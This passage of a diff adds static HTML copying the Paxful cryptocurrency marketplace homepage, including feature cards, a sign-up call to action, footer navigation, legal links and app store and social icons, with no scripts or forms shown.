0 011.138-4.38zM17 32.043l-5.347 7.256-6.017 2.794c-.972.451-.65 1.907.42 1.907H17V32.043zm14 0l5.347 7.256 6.017 2.794c.972.451.65 1.907-.42 1.907H31V32.043z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M24 13a1 1 0 00-1 1h-2a3 3 0 116 0h-2a1 1 0 00-1-1z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M23 20a1 1 0 112 0v13a1 1 0 11-2 0V20z"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M22 38a4.998 4.998 0 014.334 2.505A2.986 2.986 0 0128 40c.675 0 1.299.223 1.8.6a4.003 4.003 0 012.256-1.488 7.001 7.001 0 0113.893.041A3.001 3.001 0 0148 42v1a5 5 0 01-5 5H5a5 5 0 01-5-5v-1c0-1.325.86-2.45 2.05-2.847a7.001 7.001 0 0113.894-.04 3.995 3.995 0 011.913 1.087A4.995 4.995 0 0122 38z"></path><path fill="#00A5EF" d="M22 43a4.998 4.998 0 014.334 2.505A2.986 2.986 0 0128 45c.675 0 1.299.223 1.8.6a4.003 4.003 0 012.256-1.488 7.001 7.001 0 0113.893.041C48.5 47 44 45.675 44 47H4c0-1.325-4 0-1.95-2.847a7.001 7.001 0 0113.894-.04 3.995 3.995 0 011.913 1.087A4.995 4.995 0 0122 43z" opacity="0.2"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M9 35a5 5 0 00-5 5 1 1 0 01-1 1 1 1 0 00-1 1v2a2 2 0 002 2h40a2 2 0 002-2v-2a1 1 0 00-1-1 1 1 0 01-1-1 5 5 0 00-10 0 1 1 0 01-1 1 2 2 0 00-2 2 1 1 0 11-2 0 1 1 0 10-2 0 1 1 0 11-2 0 3 3 0 10-6 0 1 1 0 11-2 0 2 2 0 00-2-2 1 1 0 01-1-1 5 5 0 00-5-5zm17.334 5.505A4.998 4.998 0 0022 38a4.995 4.995 0 00-4.143 2.2 3.995 3.995 0 00-1.913-1.088 7.001 7.001 0 00-13.893.041A3.001 3.001 0 000 42v2a4 4 0 004 4h40a4 4 0 004-4v-2c0-1.325-.86-2.45-2.05-2.847a7.001 7.001 0 00-13.894-.04A4.003 4.003 0 0029.8 40.6 2.987 2.987 0 0028 40c-.616 0-1.19.186-1.666.505z" clip-rule="evenodd"></path></svg><strong class="d-block h4 ml-3 ml-md-0 mb-2">Valuable feedback</strong></div><p class="mb-0 regular-18">Our feedback system highlights reliable, experienced users, helping you to trade smoothly.</p></div></div><div class="col-md-4 mb-2 mb-md-0 mt-md-4"><div class="h-100 actionsBoard__card card border-0 p-3 p-sm-4 flex-grow d-flex text-dark text-center"><div class="d-flex flex-column align-items-center"><svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="multicolor mb-2 icon-multicolor"><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M30 4a3 3 0 100 6 3 3 0 000-6zm-5 3a5 5 0 1110 0 5 5 0 01-10 0zM8 16a3 3 0 00-3 3v24a3 3 0 003 3h30a3 3 0 003-3V23a3 3 0 00-3-3h-1v-1a3 3 0 00-3-3H8zm27 4v-1a1 1 0 00-1-1H8a1 1 0 00-1 1v1h28zM7 22v21a1 1 0 001 1h30a1 1 0 001-1V23a1 1 0 00-1-1H7z" clip-rule="evenodd"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M33 32a2 2 0 012-2h6a2 2 0 012 2v2a2 2 0 01-2 2h-6a2 2 0 01-2-2v-2z"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M32 32a3 3 0 013-3h6a3 3 0 013 3v2a3 3 0 01-3 3h-6a3 3 0 01-3-3v-2zm3-1a1 1 0 00-1 1v2a1 1 0 001 1h6a1 1 0 001-1v-2a1 1 0 00-1-1h-6z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M32 21c0 6.075-4.925 11-11 11s-11-4.925-11-11 4.925-11 11-11 11 4.925 11 11z" opacity="0.15"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M32 16c0 6.075-4.925 11-11 11s-11-4.925-11-11S14.925 5 21 5s11 4.925 11 11z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M21 6c-5.523 0-10 4.477-10 10s4.477 10 10 10 10-4.477 10-10S26.523 6 21 6zM9 16C9 9.373 14.373 4 21 4s12 5.373 12 12-5.373 12-12 12S9 22.627 9 16z" clip-rule="evenodd"></path><path fill="#00A5EF" d="M32 17.429c0 5.207-4.925 9.428-11 9.428s-11-4.221-11-9.428C10 12.22 14.925 8 21 8s11 4.221 11 9.429z" opacity="0.2"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M18.414 18.606v-6.485H17v-2h1.414V9h1.414v1.121h1.414V9h1.415v1.202a3.122 3.122 0 011.878 4.79 3.121 3.121 0 01-1.878 5.614v1.121h-1.415v-1.12h-1.414v1.12h-1.414v-1.12H17v-2h1.414zm1.414 0h2.829a1.121 1.121 0 000-2.242h-2.829v2.242zm0-4.242V12.12h2.122a1.121 1.121 0 010 2.243h-2.122z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M10 26a1 1 0 112 0v11a1 1 0 11-2 0V26z"></path></svg><strong class="d-block h4 ml-3 ml-md-0 mb-2">Free Paxful Wallet</strong></div><p class="mb-0 regular-18">Get a free <a href="https://paxful.com/bitcoin-wallet">Paxful Wallet</a> when you sign up to receive, send, and store your Bitcoin safely.</p></div></div><div class="col-md-4 mb-2 mb-md-0 mt-md-4"><div class="h-100 actionsBoard__card card border-0 p-3 p-sm-4 flex-grow d-flex text-dark text-center"><div class="d-flex flex-column align-items-center"><svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="multicolor mb-2 icon-multicolor"><path fill="var(--icons-secondary, #454c59)" d="M33 17a9 9 0 11-18 0 9 9 0 0118 0z" opacity="0.15"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M33 12a9 9 0 11-18 0 9 9 0 0118 0z"></path><path fill="#00A5EF" d="M33 13.5c0 4.142-4.03 7.5-9 7.5s-9-3.358-9-7.5C15 9.358 19.03 6 24 6s9 3.358 9 7.5z" opacity="0.2"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M27 10a3 3 0 11-6 0 3 3 0 016 0z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M24 8a2 2 0 100 4 2 2 0 000-4zm-4 2a4 4 0 118 0 4 4 0 01-8 0z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M16 12a8 8 0 1113.253 6.034 4.705 4.705 0 00-1.203-1.013C26.965 16.371 25.53 16 24 16c-1.53 0-2.965.37-4.05 1.021-.451.271-.87.61-1.203 1.012A7.982 7.982 0 0116 12zm4.423 7.158A7.967 7.967 0 0024 20c1.286 0 2.5-.303 3.577-.842a2.912 2.912 0 00-.556-.422C26.296 18.301 25.231 18 24 18c-1.23 0-2.296.301-3.021.736-.232.14-.415.282-.556.422zM24 2c-5.523 0-10 4.477-10 10s4.477 10 10 10 10-4.477 10-10S29.523 2 24 2z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M8 36a4 4 0 100 8 4 4 0 000-8zm-6 4a6 6 0 1112 0 6 6 0 01-12 0zm38-4a4 4 0 100 8 4 4 0 000-8zm-6 4a6 6 0 1112 0 6 6 0 01-12 0zm-10-4a4 4 0 100 8 4 4 0 000-8zm-6 4a6 6 0 1112 0 6 6 0 01-12 0z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M13.5 22.902a1 1 0 111.732 1l-4 6.928a1 1 0 01-1.732-1l4-6.928zm20.732 0a1 1 0 00-1.732 1l4 6.928a1 1 0 101.732-1l-4-6.928zM23 31a1 1 0 102 0v-6a1 1 0 10-2 0v6z"></path></svg><strong class="d-block h4 ml-3 ml-md-0 mb-2">Invite friends</strong></div><p class="mb-0 regular-18">Get your friends and family to <a href="https://paxful.com/bitcoin-affiliate-program">sign up</a> for Paxful.</p></div></div></div>
+    <div class="financ">
+    <article class="text-center iP4h4 _61MsW">
+      <h2 class="h1 mb-2 col-md-6 mx-auto">Ready to get started?</h2>
+      <p class="small-text mb-4 col-md-8 mx-auto">Explore thousands of offers to buy and sell Bitcoin to kickstart your trading journey.</p>
+      <p class="mb-0"><a href="https://paxful.com/register" class="d-block d-md-inline-block btn btn-primary btn-lg">Create Your Account</a>
+      </p>
+    </article>
+    </div>
+  </div>
+  
+  </section>
+<section>
+  <hr>
+  <div class="container">
+  <div class='faq'>
+    <h2>PAXFUL</h2>
+    <button type="button" class="btn2 btn-light">FAQ & Help Center</button>
+    <button type="button" class="btn1 btn-light"><select class="selec"><option value="" >English</option></select></button>
+  </div>
+    <div class="row">
+      <div class="col">
+        <h5>For You</h5>
+        <ul>
+          <li>Buy Bitcoin</li>
+          <li>Buy Tether</li>
+          <li>Buy Ethereum</li>
+          <li>Sell Bitcoin</li>
+          <li>Sell Tether</li>
+          <li>Sell Ethereum</li>
+          <li>Become Vendor</li>
+          <li>Paxful Wallet</li>
+        </ul>
+      </div>
+      <div class="col">
+       <h5> For Your Business</h5>
+        <ul>
+          <li>Paxful Pay</li>
+          <li>Virtual Bitcoin Kiosk</li>
+          <li>API Documentation</li>
+      
+        </ul>
+      </div>
+      <div class="col">
+        <h5>Growth</h5>
+        <ul>
+          <li>Paxful Rewards Program</li>
+          <li>Paxful Trader Program</li>
+          <li>Paxful Peer Program</li>
+          <li>Paxful Alliance</li>
+          <li>Community</li>
+         
+        </ul>
+      </div>
+      <div class="col">
+        <h5>Buy Anywhere</h5>
+        <ul>
+          <li>Buy Bitcoin in USA</li>
+          <li>Buy Bitcoin in Nigeria</li>
+          <li>Buy Bitcoin in China</li>
+          <li>Buy Bitcoin in India</li>
+      
+      </div>
+      <div class="col">
+        <h5>Buy Anywhere</h5>
+        <ul>
+          <li>Paxful Status</li>
+          <li>Bitcoin Calculator</li>
+          <li>Peer-to-Peer Market Prices</li>
+        </ul>
+      </div>
+      <div class="col">
+        <h5>About Paxful</h5>
+        <ul>       
+          <li>About Us</li>
+          <li>Business Contacts</li>
+          <li>Careers</li>
+          <li>Paxful Blog</li>
+          <li>Paxful Reviewsr</li>
+          <li>Built with Bitcoin</li>
+        </ul> 
+      </div>
+    </div>
+  </div>
+  <div class="container">
+    <div class="terms">
+      <span><b>Legal</b></span>
+      <span>Terms & Conditions</span>
+      <span>Vendor Reminder</span>
+      <span>AML Policy</span>
+      <span>Stablecoin Terms Of Service</span>
+      <span>Privacy Notice</span>
+      <span>Bug Bounty Policy</span>
+      <span>Cookie Policy</span>
+  </div>
+</div>
+<div class="container">
+  <div class="d-sm-flex justify-content-between align-items-center mb-5">
+    <nav class="d-flex justify-content-center mb-5 mb-sm-0 dark-theme-icon-disable">
+      <a href="https://apps.apple.com/us/app/paxful-bitcoin-wallet/id1443813253" target="_blank" rel="noopener noreferrer" class="UoITq mr-3">
+        <svg enable-background="new 0 0 117.7 38" viewBox="0 0 117.7 38" xmlns="http://www.w3.org/2000/svg">
+          <path d="m23.8 19.3c0-1.7.9-3.3 2.4-4.2-.9-1.3-2.4-2.1-4-2.2-1.7-.2-3.3 1-4.2 1s-2.2-1-3.6-1c-1.9.1-3.6 1.1-4.5 2.7-1.9 3.3-.5 8.3 1.4 11 .9 1.3 2 2.8 3.4 2.8 1.4-.1 1.9-.9 3.6-.9s2.1.9 3.6.9 2.4-1.3 3.3-2.7c.7-.9 1.2-2 1.5-3.1-1.8-.6-2.9-2.4-2.9-4.3z"></path>
+          <path d="m21 11.2c.8-1 1.2-2.2 1.1-3.5-1.2.1-2.4.7-3.2 1.7-.8.9-1.2 2.1-1.1 3.4 1.3 0 2.4-.6 3.2-1.6z"></path>
+          <path d="m41.3 26.1h-4.7l-1.1 3.4h-2l4.5-12.4h2l4.5 12.4h-2zm-4.2-1.5h3.8l-1.9-5.5h-.1z"></path>
+          <path d="m54.2 25c0 2.8-1.5 4.6-3.8 4.6-1.2.1-2.3-.6-2.8-1.6v4.5h-1.9v-12h1.8v1.5c.6-1 1.7-1.6 2.9-1.6 2.2-.1 3.8 1.8 3.8 4.6zm-2 0c0-1.8-.9-3-2.4-3-1.4 0-2.4 1.2-2.4 3s1 3 2.4 3c1.5 0 2.4-1.2 2.4-3z"></path>
+          <path d="m64.1 25c0 2.8-1.5 4.6-3.8 4.6-1.2.1-2.3-.6-2.8-1.6v4.5h-1.9v-12h1.8v1.5c.6-1 1.7-1.6 2.9-1.6 2.3-.1 3.8 1.8 3.8 4.6zm-1.9 0c0-1.8-.9-3-2.4-3-1.4 0-2.4 1.2-2.4 3s1 3 2.4 3c1.5 0 2.4-1.2 2.4-3z"></path>
+          <path d="m70.7 26c.1 1.2 1.3 2 3 2 1.6 0 2.7-.8 2.7-1.9 0-1-.7-1.5-2.3-1.9l-1.6-.4c-2.3-.6-3.3-1.6-3.3-3.3 0-2.1 1.9-3.6 4.5-3.6s4.4 1.5 4.5 3.6h-1.9c-.1-1.2-1.1-2-2.6-2s-2.5.8-2.5 1.9c0 .9.7 1.4 2.3 1.8l1.4.3c2.5.6 3.6 1.6 3.6 3.4 0 2.3-1.9 3.8-4.8 3.8-2.8 0-4.6-1.4-4.7-3.7z"></path>
+          <path d="m82.3 18.3v2.1h1.7v1.5h-1.7v5c0 .8.3 1.1 1.1 1.1h.6v1.5c-.3.1-.7.1-1 .1-1.8 0-2.5-.7-2.5-2.4v-5.2h-1.3v-1.5h1.3v-2.1h1.8z"></path>
+          <path d="m85.1 25c0-2.8 1.7-4.6 4.3-4.6s4.3 1.8 4.3 4.6c0 2.9-1.7 4.6-4.3 4.6-2.7 0-4.3-1.8-4.3-4.6zm6.7 0c0-2-.9-3.1-2.4-3.1s-2.4 1.1-2.4 3.1.9 3.1 2.4 3.1 2.4-1.2 2.4-3.1z"></path>
+          <path d="m95.2 20.4h1.8v1.6c.2-1 1.2-1.7 2.2-1.6.2 0 .4 0 .6.1v1.7c-.3-.1-.5-.2-.8-.2-1 0-1.9.8-1.9 1.8v.3 5.4h-1.9z"></path>
+          <path d="m108.4 26.8c-.2 1.6-1.9 2.8-3.9 2.8-2.6 0-4.3-1.8-4.3-4.6s1.6-4.7 4.2-4.7c2.5 0 4.1 1.7 4.1 4.5v.6h-6.4v.1c-.1 1.3.8 2.4 2.1 2.6h.3c.9.1 1.8-.4 2.1-1.3zm-6.3-2.7h4.5c.1-1.2-.9-2.2-2.1-2.3-.1 0-.1 0-.2 0-1.2 0-2.2 1-2.2 2.3z"></path>
+          <path d="m36.8 7.7c1.5-.1 2.7 1 2.8 2.4v.5c0 1.9-1 3-2.8 3h-2.2v-6h2.2zm-1.2 5.2h1.1c1 .1 1.9-.7 2-1.8 0-.1 0-.3 0-.4.1-1-.6-2-1.6-2.1-.1 0-.2 0-.4 0h-1.1z"></path>
+          <path d="m40.7 11.4c-.1-1.2.7-2.2 1.9-2.3s2.2.7 2.3 1.9v.4c.1 1.2-.7 2.2-1.9 2.3s-2.2-.7-2.3-1.9c0-.1 0-.2 0-.4zm3.3 0c0-1-.4-1.5-1.2-1.5s-1.2.6-1.2 1.5c0 1 .4 1.6 1.2 1.6s1.2-.6 1.2-1.6z"></path>
+          <path d="m50.6 13.7h-.9l-.9-3.3h-.1l-.9 3.3h-.9l-1.2-4.5h.9l.8 3.4h.1l.9-3.4h.9l.9 3.4h.1l.8-3.4h.9z"></path>
+          <path d="m52.9 9.2h.9v.7h.1c.2-.5.8-.8 1.3-.8.8-.1 1.5.5 1.6 1.4v.3 2.9h-.9v-2.7c0-.7-.3-1.1-1-1.1-.6 0-1.1.4-1.1 1v.2 2.6h-.9z"></path>
+          <path d="m58.1 7.4h.9v6.3h-.9z"></path>
+          <path d="m60.2 11.4c-.1-1.2.7-2.2 1.9-2.3s2.2.7 2.3 1.9v.4c.1 1.2-.7 2.2-1.9 2.3s-2.2-.7-2.3-1.9c0-.1 0-.2 0-.4zm3.3 0c0-1-.4-1.5-1.2-1.5s-1.2.6-1.2 1.5c0 1 .4 1.6 1.2 1.6s1.2-.6 1.2-1.6z"></path>
+          <path d="m65.4 12.4c0-.8.6-1.3 1.7-1.3l1.2-.1v-.4c0-.5-.3-.7-.9-.7-.5 0-.8.2-.9.5h-.9c.1-.8.8-1.3 1.8-1.3 1.1 0 1.8.6 1.8 1.5v3.1h-.9v-.6h-.1c-.3.5-.8.7-1.4.7-.7.1-1.4-.5-1.5-1.2.1-.1.1-.1.1-.2zm2.9-.4v-.4l-1.1.1c-.6 0-.9.3-.9.6 0 .4.4.6.8.6.6.2 1.1-.2 1.2-.9 0 .1 0 .1 0 0z"></path>
+          <path d="m70.3 11.4c0-1.4.7-2.3 1.9-2.3.6 0 1.1.3 1.4.8h.1v-2.5h.9v6.3h-.9v-.7h-.1c-.3.5-.8.8-1.4.8-1.1 0-1.9-.9-1.9-2.4zm1 0c0 1 .5 1.5 1.2 1.5s1.2-.6 1.2-1.5-.5-1.5-1.2-1.5c-.8 0-1.2.6-1.2 1.5z"></path>
+          <path d="m78.2 11.4c-.1-1.2.7-2.2 1.9-2.3s2.2.7 2.3 1.9v.4c.1 1.2-.7 2.2-1.9 2.3s-2.2-.7-2.3-1.9c0-.1 0-.2 0-.4zm3.4 0c0-1-.4-1.5-1.2-1.5s-1.2.6-1.2 1.5c0 1 .4 1.6 1.2 1.6.7 0 1.2-.6 1.2-1.6z"></path>
+          <path d="m83.7 9.2h.9v.7h.1c.2-.5.8-.8 1.3-.8.8-.1 1.5.5 1.6 1.4v.3 2.9h-.9v-2.7c0-.7-.3-1.1-1-1.1-.6 0-1.1.4-1.1 1v.2 2.6h-.9z"></path>
+          <path d="m92.5 8.1v1.1h1v.8h-1v2.3c0 .5.2.7.6.7h.3v.7c-.2 0-.3 0-.5 0-1 0-1.4-.3-1.4-1.2v-2.5h-.7v-.8h.7v-1.1z"></path>
+          <path d="m94.7 7.4h.9v2.5h.1c.2-.5.8-.9 1.4-.8.8 0 1.5.6 1.6 1.4v.3 2.9h-.9v-2.7c0-.7-.3-1.1-1-1.1-.6 0-1.1.4-1.1 1v.2 2.6h-.9z"></path>
+          <path d="m103.8 12.5c-.2.8-1.1 1.4-2 1.3-1.1 0-2.1-.9-2.1-2 0-.1 0-.2 0-.3-.2-1.1.6-2.2 1.8-2.3h.3c1.3 0 2 .9 2 2.3v.3h-3.2c-.1.7.4 1.2 1.1 1.3h.1c.4.1.9-.2 1.1-.5zm-3.2-1.5h2.3c0-.6-.4-1.1-1-1.2h-.1c-.6.1-1.2.6-1.2 1.2z"></path>
+        </svg>
+      </a>
+      <a href="https://play.google.com/store/apps/details?id=com.paxful.wallet&amp;hl=en" target="_blank" rel="noopener noreferrer" class="UoITq">
+        <svg enable-background="new 0 0 133.4 38.4" viewBox="0 0 133.4 38.4" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><linearGradient id="googlePlayIconIdA" gradientTransform="matrix(1 0 0 -1 0 180.4002)" gradientUnits="userSpaceOnUse" x1="20.9996" x2="4.2172" y1="172.4904" y2="155.708"><stop offset="0" stop-color="#00a0ff"></stop><stop offset=".00657445" stop-color="#00a1ff"></stop><stop offset=".2601" stop-color="#00beff"></stop><stop offset=".5122" stop-color="#00d2ff"></stop><stop offset=".7604" stop-color="#00dfff"></stop><stop offset="1" stop-color="#00e3ff"></stop></linearGradient><linearGradient id="googlePlayIconIdB" gradientTransform="matrix(1 0 0 -1 0 180.4002)" gradientUnits="userSpaceOnUse" x1="33.0343" x2="8.8374" y1="161.1987" y2="161.1987"><stop offset="0" stop-color="#ffe000"></stop><stop offset=".4087" stop-color="#ffbd00"></stop><stop offset=".7754" stop-color="#ffa500"></stop><stop offset="1" stop-color="#ff9c00"></stop></linearGradient><linearGradient id="googlePlayIconIdC" gradientTransform="matrix(1 0 0 -1 0 180.4002)" gradientUnits="userSpaceOnUse" x1="24.0269" x2="1.2686" y1="158.904" y2="136.1457"><stop offset="0" stop-color="#ff3a44"></stop><stop offset="1" stop-color="#googlePlayIconIdC31162"></stop></linearGradient><linearGradient id="googlePlayIconIdD" gradientTransform="matrix(1 0 0 -1 0 180.4002)" gradientUnits="userSpaceOnUse" x1="6.4972" x2="16.6598" y1="181.0239" y2="170.8614"><stop offset="0" stop-color="#32a071"></stop><stop offset=".0685" stop-color="#2da771"></stop><stop offset=".4762" stop-color="#15cf74"></stop><stop offset=".8009" stop-color="#06e775"></stop><stop offset="1" stop-color="#00f076"></stop></linearGradient><path d="m46.6 9.4c0 .8-.2 1.5-.7 2-.6.6-1.3.9-2.2.9s-1.6-.3-2.2-.9-.9-1.3-.9-2.2.3-1.6.9-2.2 1.3-.9 2.2-.9c.4 0 .8.1 1.2.3s.7.4.9.7l-.5.5c-.4-.5-.9-.7-1.6-.7-.7-.1-1.2.1-1.7.6-.5.4-.7 1-.7 1.7s.2 1.3.7 1.7 1 .7 1.6.7c.7 0 1.2-.2 1.7-.7.3-.3.5-.7.5-1.2h-2.2v-.7h2.9c.1.1.1.3.1.4z" stroke="#fff" stroke-miterlimit="10" stroke-width=".2"></path><path d="m51.2 6.9h-2.7v1.9h2.5v.7h-2.5v1.9h2.7v.7h-3.5v-6h3.5z" stroke="#fff" stroke-miterlimit="10" stroke-width=".2"></path>
+          <path d="m54.5 12.2h-.8v-5.3h-1.7v-.7h4.1v.7h-1.7v5.3z" stroke="#fff" stroke-miterlimit="10" stroke-width=".2"></path>
+          <path d="m59.1 12.2v-6h.8v6z" stroke="#fff" stroke-miterlimit="10" stroke-width=".2"></path>
+          <path d="m63.3 12.2h-.8v-5.3h-1.7v-.7h4.2v.7h-1.7z" stroke="#fff" stroke-miterlimit="10" stroke-width=".2"></path>
+          <path d="m72.8 11.4c-.6.6-1.3.9-2.2.9s-1.6-.3-2.2-.9-.9-1.3-.9-2.2.3-1.6.9-2.2 1.3-.9 2.2-.9 1.6.3 2.2.9.9 1.3.9 2.2-.3 1.6-.9 2.2zm-3.8-.5c.4.4 1 .7 1.6.7s1.2-.2 1.6-.7c.4-.4.7-1 .7-1.7s-.2-1.3-.7-1.7c-.4-.4-1-.7-1.6-.7s-1.2.2-1.6.7c-.4.4-.7 1-.7 1.7s.2 1.3.7 1.7z" stroke="#fff" stroke-miterlimit="10" stroke-width=".2"></path><path d="m74.8 12.2v-6h.9l2.9 4.7v-1.2-3.5h.8v6h-.8l-3.1-4.9v1.2 3.7z" stroke="#fff" stroke-miterlimit="10" stroke-width=".2"></path><path d="m67.3 21c-2.4 0-4.3 1.8-4.3 4.3 0 2.4 1.9 4.3 4.3 4.3s4.3-1.8 4.3-4.3c0-2.6-1.9-4.3-4.3-4.3zm0 6.8c-1.3 0-2.4-1.1-2.4-2.6s1.1-2.6 2.4-2.6 2.4 1 2.4 2.6c0 1.5-1.1 2.6-2.4 2.6zm-9.3-6.8c-2.4 0-4.3 1.8-4.3 4.3 0 2.4 1.9 4.3 4.3 4.3s4.3-1.8 4.3-4.3c0-2.6-1.9-4.3-4.3-4.3zm0 6.8c-1.3 0-2.4-1.1-2.4-2.6s1.1-2.6 2.4-2.6 2.4 1 2.4 2.6c0 1.5-1.1 2.6-2.4 2.6zm-11.1-5.5v1.8h4.3c-.1 1-.5 1.8-1 2.3-.6.6-1.6 1.3-3.3 1.3-2.7 0-4.7-2.1-4.7-4.8s2.1-4.8 4.7-4.8c1.4 0 2.5.6 3.3 1.3l1.3-1.3c-1.1-1-2.5-1.8-4.5-1.8-3.6 0-6.7 3-6.7 6.6s3.1 6.6 6.7 6.6c2 0 3.4-.6 4.6-1.9 1.2-1.2 1.6-2.9 1.6-4.2 0-.4 0-.8-.1-1.1zm45.4 1.4c-.4-1-1.4-2.7-3.6-2.7s-4 1.7-4 4.3c0 2.4 1.8 4.3 4.2 4.3 1.9 0 3.1-1.2 3.5-1.9l-1.4-1c-.5.7-1.1 1.2-2.1 1.2s-1.6-.4-2.1-1.3l5.7-2.4zm-5.8 1.4c0-1.6 1.3-2.5 2.2-2.5.7 0 1.4.4 1.6.9zm-4.7 4.1h1.9v-12.5h-1.9zm-3-7.3c-.5-.5-1.3-1-2.3-1-2.1 0-4.1 1.9-4.1 4.3s1.9 4.2 4.1 4.2c1 0 1.8-.5 2.2-1h.1v.6c0 1.6-.9 2.5-2.3 2.5-1.1 0-1.9-.8-2.1-1.5l-1.6.7c.5 1.1 1.7 2.5 3.8 2.5 2.2 0 4-1.3 4-4.4v-7.6h-1.8zm-2.2 5.9c-1.3 0-2.4-1.1-2.4-2.6s1.1-2.6 2.4-2.6 2.3 1.1 2.3 2.6-1 2.6-2.3 2.6zm24.4-11.1h-4.5v12.5h1.9v-4.7h2.6c2.1 0 4.1-1.5 4.1-3.9s-2-3.9-4.1-3.9zm.1 6h-2.7v-4.3h2.7c1.4 0 2.2 1.2 2.2 2.1-.1 1.1-.9 2.2-2.2 2.2zm11.5-1.8c-1.4 0-2.8.6-3.3 1.9l1.7.7c.4-.7 1-.9 1.7-.9 1 0 1.9.6 2 1.6v.1c-.3-.2-1.1-.5-1.9-.5-1.8 0-3.6 1-3.6 2.8 0 1.7 1.5 2.8 3.1 2.8 1.3 0 1.9-.6 2.4-1.2h.1v1h1.8v-4.8c-.2-2.2-1.9-3.5-4-3.5zm-.2 6.9c-.6 0-1.5-.3-1.5-1.1 0-1 1.1-1.3 2-1.3.8 0 1.2.2 1.7.4-.2 1.2-1.2 2-2.2 2zm10.5-6.6-2.1 5.4h-.1l-2.2-5.4h-2l3.3 7.6-1.9 4.2h1.9l5.1-11.8zm-16.8 8h1.9v-12.5h-1.9z"></path><path d="m9.6 6.7c-.3.3-.4.8-.4 1.4v22.1c0 .6.2 1.1.5 1.4l.1.1 12.4-12.4v-.1-.1z" fill="url(#googlePlayIconIdA)"></path><path d="m26.2 23.5-4.1-4.1v-.1-.1l4.1-4.1.1.1 4.9 2.8c1.4.8 1.4 2.1 0 2.9z" fill="url(#googlePlayIconIdB)"></path>
+          <path d="m26.3 23.4-4.2-4.2-12.5 12.5c.5.5 1.2.5 2.1.1z" fill="url(#googlePlayIconIdC)"></path>
+          <path d="m26.3 15-14.6-8.3c-.9-.5-1.6-.4-2.1.1l12.5 12.5z" fill="url(#googlePlayIconIdD)"></path>
+          <path d="m26.2 23.3-14.5 8.2c-.8.5-1.5.4-2 0l-.1.1.1.1c.5.4 1.2.5 2 0z" opacity=".2"></path>
+          <path d="m9.6 31.5c-.3-.3-.5-.8-.5-1.4v.1c0 .6.2 1.1.5 1.4z" opacity=".12"></path>
+          <path d="m31.2 20.5-5 2.8.1.1 4.9-2.8c.7-.4 1-.9 1-1.4 0 .5-.4.9-1 1.3z" opacity=".12"></path>
+          <path d="m11.7 6.8 19.5 11.1c.6.4 1 .8 1 1.3 0-.5-.3-1-1-1.4l-19.5-11.1c-1.4-.8-2.5-.1-2.5 1.5v.1c0-1.6 1.1-2.3 2.5-1.5z" opacity=".25"></path>
+        </svg>
+      </a>
+    </nav>
+    <nav class="-fprX">
+      <ul class="list-unstyled d-flex justify-content-center m-0 p-0">
+        <li class="mr-3">
+          <a id="footerLinkInstagram" class="btn btn-square d-flex justify-content-center align-items-center" href="https://www.instagram.com/paxful/" target="_blank" rel="noreferrer">
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+            <path fill-rule="evenodd" d="M8 0C5.827 0 5.555.01 4.702.048 3.85.088 3.27.222 2.76.42a3.918 3.918 0 00-1.417.923c-.445.444-.72.89-.923 1.417-.198.51-.333 1.09-.372 1.942C.008 5.555 0 5.827 0 8s.01 2.445.048 3.298c.04.851.174 1.432.372 1.942.204.525.478.973.923 1.417a3.9 3.9 0 001.417.923c.51.197 1.09.333 1.942.372.853.04 1.125.048 3.298.048s2.445-.01 3.298-.048c.851-.04 1.432-.175 1.942-.372a3.932 3.932 0 001.417-.923 3.9 3.9 0 00.923-1.417c.197-.51.333-1.09.372-1.942.04-.853.048-1.125.048-3.298s-.01-2.445-.048-3.298c-.04-.851-.175-1.433-.372-1.942a3.926 3.926 0 00-.923-1.417A3.897 3.897 0 0013.24.42c-.51-.198-1.09-.333-1.942-.372C10.445.008 10.173 0 8 0zm0 1.44c2.135 0 2.39.01 3.233.047.78.037 1.204.166 1.485.277.375.145.64.318.921.597.28.28.453.546.598.921.109.281.24.705.275 1.485.038.844.047 1.097.047 3.233s-.01 2.39-.05 3.233c-.04.78-.17 1.204-.28 1.485-.15.375-.32.64-.6.921-.279.28-.549.453-.92.598-.28.109-.71.24-1.49.275-.849.038-1.099.047-3.239.047-2.14 0-2.39-.01-3.24-.05-.78-.04-1.21-.17-1.49-.28a2.49 2.49 0 01-.92-.6 2.432 2.432 0 01-.6-.92c-.11-.28-.239-.71-.28-1.49-.03-.84-.04-1.099-.04-3.229s.01-2.39.04-3.24c.041-.78.17-1.21.28-1.49.14-.38.32-.64.6-.92.28-.28.54-.46.92-.6.28-.11.7-.24 1.48-.28.85-.03 1.1-.04 3.24-.04zm0 2.452a4.108 4.108 0 100 8.215 4.108 4.108 0 000-8.215zm0 6.775a2.666 2.666 0 110-5.334 2.666 2.666 0 110 5.334zm5.23-6.937a.96.96 0 11-1.92-.001.96.96 0 011.92.001z" clip-rule="evenodd"></path>
+          </svg>
+        </a>
+      </li>
+      <li class="mr-3">
+        <a id="footerLinkFacebook" class="btn btn-square d-flex justify-content-center align-items-center" href="https://www.facebook.com/paxful" target="_blank" rel="noreferrer"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
